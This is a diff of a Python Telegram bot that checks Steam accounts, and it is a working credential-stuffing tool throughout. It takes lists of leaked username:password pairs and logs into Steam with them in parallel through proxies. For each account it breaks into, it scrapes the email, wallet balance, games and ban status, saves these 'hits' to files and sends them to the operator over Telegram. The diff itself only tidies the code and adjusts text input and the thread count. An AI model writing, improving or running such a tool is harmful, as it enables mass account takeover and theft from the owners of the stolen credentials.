@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-STEAM CHECKER TELEGRAM BOT - Supports Text Messages + Files
+STEAM CHECKER TELEGRAM BOT - Fixed Text Input
 """
 
 import os
@@ -26,7 +26,6 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
-# ========================= CONFIG =========================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "0").strip())
 
@@ -40,9 +39,8 @@ stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
 lock = threading.Lock()
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
 
-# ====================== HELPERS ======================
+# ====================== HELPERS & CHECKER (same as before) ======================
 def create_results_folder():
     Path("Results").mkdir(parents=True, exist_ok=True)
 
@@ -61,7 +59,6 @@ def shorten_games(games, limit=12):
         return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
     return " | ".join(games)
 
-# ====================== CHECKER (Original Logic) ======================
 def check_steam_account(combo, proxy_url=None):
     try:
         username, password = combo.strip().split(':', 1)
@@ -84,7 +81,6 @@ def check_steam_account(combo, proxy_url=None):
     session.headers.update(headers)
 
     try:
-        # RSA Key
         now = str(int(time.time()))
         r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                          data=f"donotcache={now}&username={user_clean}", timeout=12)
@@ -92,7 +88,6 @@ def check_steam_account(combo, proxy_url=None):
         if not j1.get("success"):
             return None
 
-        # Encrypt password
         n = int(j1["publickey_mod"], 16)
         e = int(j1["publickey_exp"], 16)
         rsa_key = RSA.construct((n, e))
@@ -100,7 +95,6 @@ def check_steam_account(combo, proxy_url=None):
         encrypted = cipher.encrypt(password.encode("utf-8"))
         pass3 = quote_plus(base64.b64encode(encrypted).decode())
 
-        # Login
         now2 = str(int(time.time()))
         payload = f"donotcache={now2}&password={pass3}&username={user_clean}&twofactorcode=&rsatimestamp={j1['timestamp']}&remember_login=false"
 
@@ -109,12 +103,10 @@ def check_steam_account(combo, proxy_url=None):
         if not j2.get("success"):
             return None
 
-        # Cookies
         for cookie in r2.cookies:
-            for domain in [".steamcommunity.com", ".steampowered.com"]:
-                session.cookies.set(cookie.name, cookie.value, domain=domain)
+            for d in [".steamcommunity.com", ".steampowered.com"]:
+                session.cookies.set(cookie.name, cookie.value, domain=d)
 
-        # Fetch details
         time.sleep(0.6)
         r_acc = session.get("https://store.steampowered.com/account/", timeout=15)
         email, balance, country = parse_account_page(r_acc.text)
@@ -128,24 +120,14 @@ def check_steam_account(combo, proxy_url=None):
         vac, gban, cban = parse_ban_page(r_profile.text)
 
         return {
-            "username": username,
-            "password": password,
-            "email": email,
-            "balance": balance,
-            "country": country,
-            "total_games": total_games,
-            "games": games,
-            "level": level,
-            "limited": limited,
-            "vac_bans": vac,
-            "game_bans": gban,
-            "community_ban": cban,
+            "username": username, "password": password, "email": email,
+            "balance": balance, "country": country, "total_games": total_games,
+            "games": games, "level": level, "limited": limited,
+            "vac_bans": vac, "game_bans": gban, "community_ban": cban
         }
-    except Exception as e:
-        logger.debug(f"Failed {username}: {e}")
+    except:
         return None
 
-# Parsers
 def parse_account_page(html):
     email = balance = country = "Unknown"
     try:
@@ -193,7 +175,7 @@ def parse_ban_page(html):
     except: pass
     return vac, gban, cban
 
-# ====================== PROCESS ======================
+# ====================== PROCESSING ======================
 def process_account(combo, proxies, chat_id, bot):
     proxy = random.choice(proxies) if proxies else None
     result = check_steam_account(combo, proxy)
@@ -201,7 +183,6 @@ def process_account(combo, proxies, chat_id, bot):
     if result:
         hit_line = f"{result['username']}:{result['password']}"
         save_hit("All_Hits.txt", hit_line)
-
         if result['email'] != "Unknown":
             save_hit("Valid_With_Email.txt", f"{hit_line}\n{result['email']}:{result['password']}")
         else:
@@ -220,10 +201,7 @@ def process_account(combo, proxies, chat_id, bot):
 
 💎 {MY_SIGNATURE}"""
 
-        try:
-            asyncio.run(bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML))
-        except: pass
-
+        asyncio.run(bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML))
         with lock:
             stats['valid'] += 1
     else:
@@ -248,7 +226,7 @@ async def run_checker(combos, proxies, chat_id, bot):
 
     asyncio.create_task(progress())
 
-    with ThreadPoolExecutor(max_workers=20) as executor:
+    with ThreadPoolExecutor(max_workers=15) as executor:
         for combo in combos:
             executor.submit(process_account, combo, proxies, chat_id, bot)
 
@@ -277,9 +255,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
     await update.message.reply_text(
         "🤖 <b>Steam Checker Bot Ready</b>\n\n"
-        "• Paste combos directly (one per line)\n"
-        "• Or upload .txt file\n"
-        "• Send proxies.txt\n"
+        "Paste combos directly (one per line) or upload .txt file\n"
         "/status", parse_mode=ParseMode.HTML)
 
 async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -295,15 +271,17 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
+    
     text = update.message.text.strip()
     if not text or ':' not in text:
         return
 
-    combos = [line.strip() for line in text.splitlines() if ':' in line.strip()]
+    combos = [line.strip() for line in text.splitlines() if ':' in line.strip() and len(line.strip()) > 5]
     if not combos:
+        await update.message.reply_text("No valid combos found in your message.")
         return
 
-    await update.message.reply_text(f"✅ Received {len(combos)} combos. Starting check...")
+    await update.message.reply_text(f"✅ Received {len(combos)} combos. Starting check with 15 threads...")
 
     proxies = context.user_data.get('proxies', [])
     asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))
@@ -315,7 +293,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Only .txt files!")
         return
 
-    await update.message.reply_text(f"📥 Received: {doc.file_name}")
+    await update.message.reply_text(f"📥 Received file: {doc.file_name}")
     file = await doc.get_file()
     path = f"/tmp/{doc.file_name}"
     await file.download_to_drive(path)
@@ -328,14 +306,13 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     with open(path, encoding='utf-8', errors='ignore') as f:
-        combos = [line.strip() for line in f if ':' in line.strip()]
+        combos = [line.strip() for line in f if ':' in line.strip() and len(line.strip()) > 5]
 
     await update.message.reply_text(f"✅ Loaded {len(combos)} accounts from file. Starting...")
 
     proxies = context.user_data.get('proxies', [])
     asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))
 
-# ====================== MAIN ======================
 def main():
     create_results_folder()
     app = Application.builder().token(TELEGRAM_TOKEN).build()
@@ -345,7 +322,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_text))
     app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
 
-    print("🚀 Steam Checker Bot Started - Text + File Support")
+    print("🚀 Steam Checker Bot Started - Text Input Fixed")
     app.run_polling()
 
 if __name__ == "__main__":
